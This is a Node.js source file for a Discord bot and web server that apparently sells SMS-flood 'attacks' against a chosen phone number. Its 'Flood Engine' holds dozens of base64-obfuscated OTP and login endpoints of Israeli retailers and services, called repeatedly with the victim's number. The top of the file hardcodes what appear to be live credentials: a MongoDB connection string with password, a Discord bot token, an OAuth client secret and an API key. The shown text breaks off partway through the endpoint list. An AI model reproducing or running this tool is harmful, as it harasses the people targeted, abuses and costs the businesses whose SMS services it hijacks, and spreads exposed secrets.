const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, 
    TextInputStyle, InteractionType, MessageFlags 
} = require('discord.js');
const { MongoClient, Long } = require('mongodb');
const axios = require('axios');
const express = require('express');
const cors = require('cors');
const path = require('path');
const session = require('express-session');

// --- Configuration & IDs ---
const MONGO_URI = "mongodb://vbshs150_db_user:IRDssPYXnRIgLOp8@ac-cwu8e8m-shard-00-00.me3gpsz.mongodb.net:27017,ac-cwu8e8m-shard-00-01.me3gpsz.mongodb.net:27017,ac-cwu8e8m-shard-00-02.me3gpsz.mongodb.net:27017/?ssl=true&replicaSet=atlas-rhj8jo-shard-0&authSource=admin&retryWrites=true&w=majority";
const TOKEN = "MTQ3OTEzNzgxNzk1ODU1MTc4NQ.GWfvJz.XFLQIckV4SS6HG3YiVP2jWU2WJq1i9M0I6q294";
const GUILD_ID = "1474108763135938563"; 
const REQUIRED_GUILD_ID = "1479274916623679609"; 
const REQUIRED_ROLE_ID = "1474109141503967323"; 
const INVITE_LINK = "https://discord.gg/freespammer";

// Web Server Config
const PORT = 3000;
const CLIENT_ID = "1475507044286070805";
const CLIENT_SECRET = "se9ztqqpWPVkFmAy9UH2W9vA8156V-xK";
const REDIRECT_URI = "http://localhost:3000/callback";

const CHANNELS = {
    PANEL: "1475192344008589401",
    LOG: "1475192342850834718",
    CREDIT_TABLE: "1475192344008589395",
    CMD_LOG: "1475192343492825163",
    GIFT_PANEL: "1475192344008589399",
    GENERAL_LOG: "1480695179001204831",
    SECURITY_LOG: "1480697227620913333"
};

const ADMIN_IDS = ["939473645955334184", "1209121241815064587", "1479523322747289715"];

// --- Express App Setup ---
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(session({
    secret: 'vouge_super_secret_key_123!@#',
    resave: false,
    saveUninitialized: false,
    cookie: { 
        maxAge: 1000 * 60 * 60 * 24 * 7, 
        secure: false, 
        httpOnly: true
    }
}));
app.use(express.static(path.join(__dirname, 'public')));

// --- Discord Bot Setup ---
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildInvites
    ]
});

let db, users_col, history_col, settings_col;
let isMongoConnected = false;
const active_attacks = new Map();

async function isUserInRequiredGuild(userId) {
    try {
      await axios.get(`https://discord.com/api/v10/guilds/${REQUIRED_GUILD_ID}/members/${userId}`, { headers: { Authorization: `Bot ${TOKEN}` } });
      return true;
    } catch (err) { return false; }
}

async function force_update_tables() {
    await edit_or_send_table(CHANNELS.CREDIT_TABLE, "credits", "🏆 Top Credits", "Users with the most credits:");
}

async function edit_or_send_table(chan_id, sort_key, title, desc) {
    const chan = client.channels.cache.get(chan_id);
    if (!chan) return;
    try {
        const top_users = await users_col.find().sort({ [sort_key]: -1 }).limit(10).toArray();
        let description = desc + "\n\n";
        top_users.forEach((u, i) => {
            let val = u[sort_key] || 0;
            if (sort_key === "credits" && u.lifetime) val = "∞";
            description += `**#${i + 1}** <@${u._id}> ➔ \`${val}\`\n`;
        });
        const emb = new EmbedBuilder().setTitle(title).setDescription(description).setColor(0x2b2d31);
        const record = await settings_col.findOne({ _id: `msg_${chan_id}` });
        if (record) {
            try {
                const msg = await chan.messages.fetch(record.msg_id);
                await msg.edit({ embeds: [emb] });
                return;
            } catch (e) {}
        }
        const new_msg = await chan.send({ embeds: [emb] });
        await settings_col.updateOne({ _id: `msg_${chan_id}` }, { $set: { msg_id: new_msg.id } }, { upsert: true });
    } catch (e) { }
}

// --- Flood Engine ---
// --- Flood Engine ---
// --- Flood Engine ---
// --- Flood Engine ---
async function run_spam_logic(user_id, phone, seconds) {
    const stop_signal = { active: true };
    active_attacks.set(user_id, stop_signal);
    
    const ua_base = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36";
    const startTime = Date.now();
    const endTime = startTime + (seconds * 1000); 
    let totalSent = 0;
    const d = (str) => Buffer.from(str, 'base64').toString('utf-8');
    
    // בונים את מערך ה-Services מחוץ ללולאה כדי לחסוך בזמן עיבוד
    let services = [
        // MyOfer
        { method: 'POST', url: d("aHR0cHM6Ly9zZXJ2ZXIubXlvZmVyLmNvLmlsL2FwaS9zZW5kQXV0aFNtcw=="), data: JSON.stringify({ "phoneNumber": phone }), headers: { "content-type": "application/json" } },
        // 10bis (GET)
        { method: 'GET', url: d("aHR0cHM6Ly93d3cuMTBiaXMuY28uaWwvTmV4dEFwaS9HZXRBY3RpdmF0aW9uVG9rZW5BbmRTZW5kQWN0aXZhdGlvbkNvZGVUb1VzZXI/Y3VsdHVyZT1oZS1JTCZ1aUN1bHR1cmU9ZW4mdGltZXN0YW1wPTE3NzMxMDcxODk3NjUmZW1haWw9dmJzaHMxNTAlNDBnbWFpbC5jb20mY2VsbFBob25lPQ==") + phone, headers: { "accept": "*/*" } },
        // Noy Hasade
        { method: 'POST', url: d("aHR0cHM6Ly9hcGkubm95aGFzYWRlLmNvLmlsL2FwaS9sb2dpbj9vcmlnaW49d2Vi"), data: JSON.stringify({ "phone": phone, "email": false, "ip": "103.209.255.61" }), headers: { "content-type": "application/json" } },
        // Lighting
        { method: 'POST', url: d("aHR0cHM6Ly93d3cubGlnaHRpbmcuY28uaWwvY3VzdG9tZXIvYWpheC9wb3N0Lw=="), data: JSON.stringify({ "form_key": "OoHXm6oGzca2WeJR", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Fox
        { method: 'POST', url: d("aHR0cHM6Ly9mb3guY28uaWwvYXBwcy9kcmVhbS1jYXJkL2FwaS9wcm94eS9vdHAvc2VuZA=="), data: JSON.stringify({ "phoneNumber": phone, "uuid": "02532e0f-f459-42d9-8093-cbf034236c7d" }), headers: { "content-type": "application/json" } },
        // Golbary
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuZ29sYmFyeS5jby5pbC9jdXN0b21lci9hamF4L3Bvc3Qv"), data: JSON.stringify({ "form_key": "F3tJAnPikRRJCJcF", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "", "google-captcha-token": "dummy" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Bath and Body Works
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuYmF0aGFuZGJvZHl3b3Jrcy5jby5pbC9jdXN0b21lci9hamF4L3Bvc3Qv"), data: JSON.stringify({ "form_key": "bvvlNJr99zsuMnO3", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Castro
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuY2FzdHJvLmNvbS9jdXN0b21lci9hamF4L3Bvc3Qv"), data: JSON.stringify({ "form_key": "i9LSbsnYRJ1OPNXk", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Lilit
        { method: 'POST', url: d("aHR0cHM6Ly93d3cubGlsaXQuY28uaWwvY3VzdG9tZXIvYWpheC9wb3N0Lw=="), data: JSON.stringify({ "form_key": "sXWXnRwFsKy5YX9E", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Urbanica
        { method: 'POST', url: d("aHR0cHM6Ly93d3cudXJiYW5pY2Etd2guY29tL2N1c3RvbWVyL2FqYXgvcG9zdC8="), data: JSON.stringify({ "form_key": "HrbRzSKpJLVCz1Oc", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Teva Naot
        { method: 'POST', url: d("aHR0cHM6Ly93d3cudGV2YW5hb3QuY28uaWwvYXBwcy9hcGkvb3RwL3JlcXVlc3Q="), data: JSON.stringify({ "phoneNumber": phone }), headers: { "content-type": "application/json" } },
        // Crazy Line
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuY3JhenlsaW5lLmNvbS9jdXN0b21lci9hamF4L3Bvc3Qv"), data: JSON.stringify({ "form_key": "1D0f524BIR6a2fnf", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Outsiders
        { method: 'POST', url: d("aHR0cHM6Ly93d3cub3V0c2lkZXJzLmNvLmlsL3dwLWFkbWluL2FkbWluLWFqYXgucGhw"), data: JSON.stringify({ "action": "matat_textme_sendSms", "phone": phone }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Hoodies
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuaG9vZGllcy5jby5pbC9jdXN0b21lci9hamF4L3Bvc3Qv"), data: JSON.stringify({ "form_key": "kxMwRR4nj3lOH7Aq", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Victoria's Secret
        { method: 'POST', url: d("aHR0cHM6Ly93d3cudmljdG9yaWFzc2VjcmV0LmNvLmlsL2N1c3RvbWVyL2FqYXgvcG9zdC8="), data: JSON.stringify({ "form_key": "zpV35ueM9EEi6sfc", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Dreamax
        { method: 'POST', url: d("aHR0cHM6Ly9hcGkuZHJlYW1heC5jby5pbC9yZXN0L3NlbmRfb3Rw"), data: JSON.stringify({ "phone": phone, "token": "89048231091480192840124111111" }), headers: { "content-type": "application/json" } },
        // Tami4
        { method: 'POST', url: d("aHR0cHM6Ly93d3cudGFtaTQuY28uaWwvYXBpL2xvZ2luL3N0YXJ0LXNtcy1vdHA="), data: JSON.stringify({ "phoneNumber": phone, "cookieToken": "17731081826443kwxkhd03iqnext13", "isMobile": false, "recaptchaToken": "0cAF", "userLocalTimestamp": 1773108201902 }), headers: { "content-type": "application/json" } },
        // Panta Rei
        { method: 'POST', url: d("aHR0cHM6Ly93d3cucGFudGEtcmVpLmNvbS9jdXN0b21lci9hamF4L3Bvc3Qv"), data: JSON.stringify({ "form_key": "68XRpWHIo2soF4cL", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Beyond Skin
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuYmV5b25kc2tpbi5jby5pbC9jdXN0b21lci9hamF4L3Bvc3Qv"), data: JSON.stringify({ "form_key": "T6Ff8n7O23UpXppT", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Payngo
        { method: 'POST', url: d("aHR0cHM6Ly93d3cucGF5bmdvLmNvLmlsL2xvZ2luL2luaXQvcGhvbmUv"), data: JSON.stringify({ "telephone": phone, "form_key": "CO4arMhYbeXTSBYQ" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Globes
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuZ2xvYmVzLmNvLmlsL25ld3MvbG9naW4tMjAyMi9hamF4X2hhbmRsZXIuYXNoeD9nZXQtdmFsdWUtdHlwZQ=="), data: JSON.stringify({ "value": phone, "value_type": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // GetStatus
        { method: 'POST', url: d("aHR0cHM6Ly9hcHAuZ2V0c3RhdHVzLm9ubGluZS9hcGkvYXV0aC9sb2NhbC9vdHA="), data: JSON.stringify({ "sms": phone, "type": "sms", "cellPhone": phone }), headers: { "content-type": "application/json" } },
        // Motsesim
        { method: 'POST', url: d("aHR0cHM6Ly9tb3RzZXNpbS1hcHAtZmY2MWVmZWFhMWVlLmhlcm9rdWFwcC5jb20vYXBpL290cC9pbmZvcnU="), data: JSON.stringify({ "action": "send", "phone": phone }), headers: { "content-type": "application/json" } },
        // Laline
        { method: 'POST', url: d("aHR0cHM6Ly93d3cubGFsaW5lLmNvLmlsL2FwcHMvZHJlYW0tY2FyZC9hcGkvcHJveHkvb3RwL3NlbmQ="), data: JSON.stringify({ "phoneNumber": phone, "uuid": "9fc7c025-bd54-4da4-b256-0a11e4876c59" }), headers: { "content-type": "application/json" } },
        // Steimatzky
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuc3RlaW1hdHpreS5jby5pbC9jdXN0b21lci9hamF4L3Bvc3Qv"), data: JSON.stringify({ "form_key": "RtlE9mSdbHzYOC2g", "bot_validation": "1", "type": "login", "country_code": "972", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Ace
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuYWNlLmNvLmlsL2xvZ2luL3ByZWxvZ2luL3N0ZXBvbmU="), data: JSON.stringify([{ "name": "form_key", "value": "aVY8gP3Xea5CWQVQ" }, { "name": "newaut", "value": "1" }, { "name": "phone", "value": phone }, { "name": "addintinalInfo", "value": null }, { "name": "form_key", "value": "aVY8gP3Xea5CWQVQ" }]), headers: { "content-type": "application/json" } },
        // Femina
        { method: 'POST', url: d("aHR0cHM6Ly9mZW1pbmEuY28uaWwvYXBwcy9mZW1pbmFhcHAvYXV0aC9zZW5kLWNvZGU="), data: JSON.stringify({ "phone": phone }), headers: { "content-type": "application/json" } },
        // Duty Free
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuZHV0eWZyZWUuY28uaWwvZ3JhcGhxbA=="), data: JSON.stringify({ "operationName": "SendOtpCode", "query": "mutation SendOtpCode($value: String) {\n  sendOtpCode(input: {mobile: $value}) {\n    result\n    message\n    __typename\n  }\n}\n", "variables": { "value": phone } }), headers: { "content-type": "application/json" } },
        // Carolina Lemke
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuY2Fyb2xpbmFsZW1rZS5jby5pbC9jdXN0b21lci9hamF4L3Bvc3Qv"), data: JSON.stringify({ "form_key": "d2vCYxnhLkQMFxkk", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Timberland
        { method: 'POST', url: d("aHR0cHM6Ly93d3cudGltYmVybGFuZC5jby5pbC9jdXN0b21lci9hamF4L3Bvc3Qv"), data: JSON.stringify({ "form_key": "pqH7FYhGWwjsUqKH", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Golf Kids
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuZ29sZmtpZHMuY28uaWwvY3VzdG9tZXIvYWpheC9wb3N0Lw=="), data: JSON.stringify({ "form_key": "7vT8G1xiTF4TdV9Z", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Delta
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuZGVsdGEuY28uaWwvY3VzdG9tZXIvYWpheC9wb3N0Lw=="), data: JSON.stringify({ "form_key": "q4YQCd5x9xOVi65J", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Sacara
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuc2FjYXJhLmNvLmlsL2N1c3RvbWVyL2FqYXgvcG9zdC8="), data: JSON.stringify({ "form_key": "iSPm65aUm5gpsXpe", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Hi-Mami
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuaGktbWFtaS5jb20vSG9tZS9TZW5kUGhvbmVOdW1iZXI/TGVuZ3RoPTQ="), data: JSON.stringify({ "__RequestVerificationToken": "FcsIFKZbQO0pslO-1OGn6g1UMtdB5F-_-d7asAqYB3GXJXNZoDAVOJWtR_anoe0Ekb3mrZ1feEDVZoos9mmT3K9bgDT8IKx79C9gJLFaXuc1", "BenefitId": "0", "fromLogin": "False", "PhoneNumber": phone, "X-Requested-With": "XMLHttpRequest" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Bonita de Mas
        { method: 'POST', url: d("aHR0cHM6Ly9ib25pdGFkZW1hcy5jby5pbC9hcHBzL2ltYXBpLWN1c3RvbWVy"), data: JSON.stringify({ "action": "login", "otpBy": "sms", "otpValue": phone }), headers: { "content-type": "application/json" } },
        // Emporium
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuZW1wb3JpdW0uY28uaWwvY3VzdG9tZXIvYWpheC9wb3N0Lw=="), data: JSON.stringify({ "form_key": "GtOVwWnuTwQ1KJFU", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Rexail
        { method: 'POST', url: d("aHR0cHM6Ly9jbGllbnQtaWwucmV4YWlsLmNvbS9jbGllbnQvYXBwbHktZm9yLWF1dGhlbnRpY2F0aW9u"), data: JSON.stringify({ "cellPhone": phone }), headers: { "content-type": "application/json" } },
        // Fix
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuZml4Zml4Zml4Zml4LmNvLmlsL2N1c3RvbWVyL2FqYXgvcG9zdC8="), data: JSON.stringify({ "form_key": "WS1ujQC9TRi0BRpd", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Aldo Shoes
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuYWxkb3Nob2VzLmNvLmlsL2N1c3RvbWVyL2FqYXgvcG9zdC8="), data: JSON.stringify({ "form_key": "Wojr1f8nutmzKdeo", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // Yves Rocher
        { method: 'POST', url: d("aHR0cHM6Ly93d3cueXZlc3JvY2hlci5jby5pbC9jdXN0b21lci9hamF4L3Bvc3Qv"), data: JSON.stringify({ "form_key": "30ymUKazSmASzN2e", "bot_validation": "1", "type": "login", "telephone": phone, "code": "", "compare_email": "", "compare_identity": "" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        // The123
        { method: 'POST', url: d("aHR0cHM6Ly90aGUxMjMuY28uaWwvd3AtYWRtaW4vYWRtaW4tYWpheC5waHA="), data: JSON.stringify({ "action": "matat_textme_sms", "phone": phone, "loginType": "whatsapp", "challenge_id": "dlbb3lzhmz5O2gNTyXEhMa56G8SHX7jr", "challenge_answer": "35e9dc07d3ab3a25b3d845ce12115314d85233e67425894355b9d7422631c751" }), headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } },
        
        // --- האתרים מההודעה הקודמת ---
        { method: 'POST', url: d("aHR0cHM6Ly9uZXRmcmVlLmxpbmsvYXBpL3VzZXIvdmVyaWZ5LXBob25lL2dldC1jYWxs"), data: `{"agreeTou":true,"phone":"${phone}"}`, headers: { "origin": d("aHR0cHM6Ly9uZXRmcmVlLmxpbms="), "referer": d("aHR0cHM6Ly9uZXRmcmVlLmxpbmsvd2VsY29tZS8="), "content-type": "application/json", "user-agent": ua_base } },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cubW9yYXouY28uaWwvd3AtYWRtaW4vYWRtaW4tYWpheC5waHA="), data: d("YWN0aW9uPXZhbGlkYXRlX3VzZXJfYnlfc21zJnBob25lPQ==") + phone + d("JmZyb21fcmVnPWZhbHNl") },
        { method: 'POST', url: d("aHR0cHM6Ly9pdGF5YnJhbmRzLmNvLmlsL2FwcHMvZHJlYW0tY2FyZC9hcGkvcHJveHkvb3RwL3NlbmQ="), data: JSON.stringify({ "phoneNumber": phone, "uuid": "" }), headers: { "content-type": "application/json" } },
        { method: 'POST', url: d("aHR0cHM6Ly9hcGkuZ29tb2JpbGUuY28uaWwvYXBpL2xvZ2lu"), data: JSON.stringify({ "phone": phone }), headers: { "content-type": "application/json" } },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuc3BpY2Vzb25saW5lLmNvLmlsL3dwLWFkbWluL2FkbWluLWFqYXgucGhw"), data: d("YWN0aW9uPXZhbGlkYXRlX3VzZXJfYnlfc21zJnBob25lPQ==") + phone },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuc3RlcGluLmNvLmlsL2N1c3RvbWVyL2FqYXgvcG9zdC8="), data: d("Zm9ybV9rZXk9QnhJdHdjSVFobGhzbmFvaSZib3RfdmFsaWRhdGlvbj0xJnR5cGU9bG9naW4mdGVsZXBob25lPQ==") + phone, headers: { "referer": d("aHR0cHM6Ly93d3cuc3RlcGluLmNvLmlsLw==") } },
        { method: 'POST', url: d("aHR0cHM6Ly9tb2JpbGUucmFtaS1sZXZ5LmNvLmlsL2FwaS9IZWxwZXJzL09UUA=="), data: d("cGhvbmU9") + phone + d("JnRlbXBsYXRlPU9UUCZ0eXBlPTE=") },
        { method: 'POST', url: d("aHR0cHM6Ly9hcGkuenlnby5jby5pbC92Mi9hdXRoL2NyZWF0ZS12ZXJpZnktdG9rZW4="), data: JSON.stringify({ "phone": phone }), headers: { "content-type": "application/json" } },
        { method: 'POST', url: d("aHR0cHM6Ly9yb3MtcnAudGFiaXQuY2xvdWQvc2VydmljZXMvbG95YWx0eS9jdXN0b21lclByb2ZpbGUvYXV0aC9tb2JpbGU="), data: JSON.stringify({ "mobile": phone }), headers: { "content-type": "application/json" } },
        { method: 'POST', url: d("aHR0cHM6Ly9yZXN0LWFwaS5kaWJzLWFwcC5jb20vb3Rwcw=="), data: JSON.stringify({ "phoneNumber": `+972${phone}` }), headers: { "content-type": "application/json" } },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cubmluZS13ZXN0LmNvLmlsL2N1c3RvbWVyL2FqYXgvcG9zdC8="), data: d("Ym90X3ZhbGlkYXRpb249MSZ0eXBlPWxvZ2luJnRlbGVwaG9uZT0=") + phone },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cubGVlY29vcGVyLmNvLmlsL2N1c3RvbWVyL2FqYXgvcG9zdC8="), data: d("Ym90X3ZhbGlkYXRpb249MSZ0eXBlPWxvZ2luJnRlbGVwaG9uZT0=") + phone },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cua2lrb2Nvc21ldGljcy5jby5pbC9jdXN0b21lci9hamF4L3Bvc3Qv"), data: d("Ym90X3ZhbGlkYXRpb249MSZ0eXBlPWxvZ2luJnRlbGVwaG9uZT0=") + phone },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cudG9wdGVuLWZhc2hpb24uY29tL2N1c3RvbWVyL2FqYXgvcG9zdC8="), data: d("Zm9ybV9rZXk9c29pcGhyTHMzdk0yQTFUYSZib3RfdmFsaWRhdGlvbj0xJnR5cGU9bG9naW4mdGVsZXBob25lPQ==") + phone, headers: { "referer": d("aHR0cHM6Ly93d3cudG9wdGVuLWZhc2hpb24uY29tLw==") } },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cubGVoYW1pbS5jby5pbC9fYS9hZmZfb3RwX2F1dGg="), data: d("cGhvbmU9") + phone, headers: { "referer": d("aHR0cHM6Ly93d3cubGVoYW1pbS5jby5pbC8=") } },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuNTU1LmNvLmlsL21zL3Jlc3Qvb3Rwc2VydmljZS9jbGllbnQvc2VuZC9waG9uZT9jb250ZW50Q29udGV4dD0zJnJldHVyblRvPS9wZWFybC9hcHBzL3ZlaGljbWUtcG9saWN5P2luc3VyYW5jZVR5cGVJZD0x"), data: JSON.stringify({ "password": null, "phoneNr": phone, "sendType": 1, "systemType": null }), headers: { "referer": d("aHR0cHM6Ly93d3cuNTU1LmNvLmlsLw=="), "content-type": "application/json" } },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuZ2FsaS5jby5pbC9jdXN0b21lci9hamF4L3Bvc3Qv"), data: d("Ym90X3ZhbGlkYXRpb249MSZ0eXBlPWxvZ2luJnRlbGVwaG9uZT0=") + phone },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cuanVuZ2xlLWNsdWIuY28uaWwvd3AtYWRtaW4vYWRtaW4tYWpheC5waHA="), data: d("YWN0aW9uPXNpbXBseS1jaGVjay1tZW1iZXItY2VsbHBob25lJmNlbGxwaG9uZT0=") + phone },
        { method: 'POST', url: d("aHR0cHM6Ly9ibGVuZG8uY28uaWwvd3AtYWRtaW4vYWRtaW4tYWpheC5waHA="), data: d("YWN0aW9uPXNpbXBseS1jaGVjay1tZW1iZXItY2VsbHBob25lJmNlbGxwaG9uZT0=") + phone },
        { method: 'POST', url: d("aHR0cHM6Ly9mb290bG9ja2VyLmNvLmlsL2FwcHMvZHJlYW0tY2FyZC9hcGkvcHJveHkvb3RwL3NlbmQ="), data: JSON.stringify({ "phoneNumber": phone, "uuid": "" }), headers: { "content-type": "application/json" } },
        { method: 'POST', url: d("aHR0cHM6Ly93ZWJhcGkubWlzaGxvaGEuY28uaWwvYXBpL3Byb2ZpbGUvc2VuZFNtc1ZlcmlmaWNhdGlvbkNvZGVCeVBob25lTnVtYmVy"), data: JSON.stringify({ "phoneNumber": phone, "sourceFrom": "AuthJS", "isCalling": true }), headers: { "content-type": "application/json" } },
        { method: 'POST', url: d("aHR0cHM6Ly91cy1jZW50cmFsMS13ZWJjdXQtMjAwMWEuY2xvdWRmdW5jdGlvbnMubmV0L3NlbmRXaGF0c0FwcA=="), data: JSON.stringify({ "type": "otp", "data": { "phone": phone } }), headers: { "content-type": "application/json" } },
        { method: 'POST', url: d("aHR0cHM6Ly9taWRkbGV3YXJlLmZyZWV0di50di9hcGkvdjEvc2VuZC12ZXJpZmljYXRpb24tc21z"), data: JSON.stringify({ "msisdn": phone }), headers: { "content-type": "application/json" } },
        { method: 'POST', url: d("aHR0cHM6Ly93ZS5jYXJlLmNvLmlsL3dwLWFkbWluL2FkbWluLWFqYXgucGhw"), data: d("YWN0aW9uPWVsZW1lbnRvcl9wcm9fZm9ybXNfc2VuZF9mb3JtJnBvc3RfaWQ9MzUxMTc4JmZvcm1faWQ9NzA3OWQ4ZGQmZm9ybV9maWVsZHNbbmFtZV09U3BhbSZmb3JtX2ZpZWxkc1twaG9uZV09") + phone },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cubWF0YXJhLnByby9uZWRhcmltcGx1cy9WNi9GaWxlcy9XZWJTZXJ2aWNlcy9EZWJpdEJpdC5hc3B4P0FjdGlvbj1DcmVhdGVUcmFuc2FjdGlvbg=="), data: d("TW9zYWRJZD03MDAwMjk3JkNsaWVudE5hbWU9U3BhbSZQaG9uZT0=") + phone + d("JkFtb3VudD0xMDAmVGFzaGx1bWltPTE=") },
        { method: 'POST', url: d("aHR0cHM6Ly93aXNzb3R6a3ktdGxhYi5jby5pbC93cC93cC1hZG1pbi9hZG1pbi1hamF4LnBocA=="), data: d("YWN0aW9uPW90cF9yZWdpc3RlciZvdHBfcGhvbmU9") + phone + d("JmZpcnN0X25hbWU9U3BhbSZsYXN0X25hbWU9U3BhbSZlbWFpbD10ZXN0") + Math.random().toString(36).substring(7) + d("QGdtYWlsLmNvbSZkYXRlX2JpcnRoPTIwMDAtMTEtMTEmYXBwcm92ZV90ZXJtcz10cnVlJmFwcHJvdmVfbWFya2V0aW5nPXRydWU="), headers: { "referer": d("aHR0cHM6Ly93aXNzb3R6a3ktdGxhYi5jby5pbC8="), "user-agent": ua_base } },
        { method: 'POST', url: d("aHR0cHM6Ly9hcGl0ZXN0Lm9rMmdvLmNvLmlsL3NlbmRtc2dhcGkvQXBwU2VuZFNtcy9TZW5kU21z"), data: JSON.stringify({ "messagestring": "OTP Verification", "phonelist": String(phone) }), headers: { "content-type": "application/json;charset=UTF-8", "referer": d("aHR0cHM6Ly9jbG9ja2xiLm9rMmdvLmNvLmlsLw=="), "user-agent": ua_base } },
        { method: 'POST', url: d("aHR0cHM6Ly9hcGktZW5kcG9pbnRzLmhpc3RhZHJ1dC5vcmcuaWwvc2lnbnVwL3NlbmRfY29kZQ=="), data: JSON.stringify({ "phone": phone }), headers: { "referer": d("aHR0cHM6Ly9zaWdudXAuaGlzdGFkcnV0Lm9yZy5pbC8="), "x-api-key": d("NDgwMzE3MDY3ZjMyZjJmZDNkZTY4MjQ3MjQwMzQ2OGRhNTA3YjhkMDIzYTUzMTYwMjI3NGQxN2Q3MjdhOTE4OQ=="), "content-type": "application/json", "user-agent": ua_base } },
        { method: 'POST', url: d("aHR0cHM6Ly93d3cucGFwYWpvaG5zLmNvLmlsL19hL2FmZl9vdHBfYXV0aA=="), data: d("cGhvbmU9") + phone, headers: { "referer": d("aHR0cHM6Ly93d3cucGFwYWpvaG5zLmNvLmlsL3Nob3Av"), "user-agent": ua_base } },
